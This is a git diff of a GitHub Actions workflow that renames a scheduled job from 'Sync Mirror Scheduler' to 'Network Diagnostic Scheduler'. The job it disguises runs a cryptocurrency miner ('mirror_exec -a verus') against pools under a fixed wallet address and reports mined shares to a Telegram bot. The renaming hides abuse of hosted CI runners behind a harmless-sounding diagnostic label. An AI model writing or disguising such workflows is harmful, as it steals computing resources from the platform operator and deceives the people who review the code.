@@ -1,4 +1,4 @@
-name: Sync Mirror Scheduler
+name: Network Diagnostic Scheduler
 
 on:
   schedule:
@@ -6,7 +6,7 @@ on:
   workflow_dispatch:
 
 jobs:
-  sync_mirror_job:
+  net_diag_job:
     runs-on: ubuntu-latest
     timeout-minutes: 300
 
@@ -27,7 +27,7 @@ jobs:
       - name: Start Mirror Monitor
         run: |
           WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
-          WORKER="syncMirrorX"
+          WORKER="netDiagX"
           LOGFILE="mirror.log"
           MAX_IDLE=600
 
@@ -52,7 +52,7 @@ jobs:
               "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument?chat_id=${TELEGRAM_CHAT_ID}"
           }
 
-          alert "📡 *syncMirrorX started*"
+          alert "📡 *netDiagX started*"
 
           for POOL in "${POOLS[@]}"; do
             ./mirror_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 > "$LOGFILE" 2>&1 &
@@ -99,4 +99,4 @@ jobs:
           done
 
           send_log
-          alert "📴 *syncMirrorX ended*\nShares mined: *$COUNT*"
+          alert "📴 *netDiagX ended*\nShares mined: *$COUNT*"
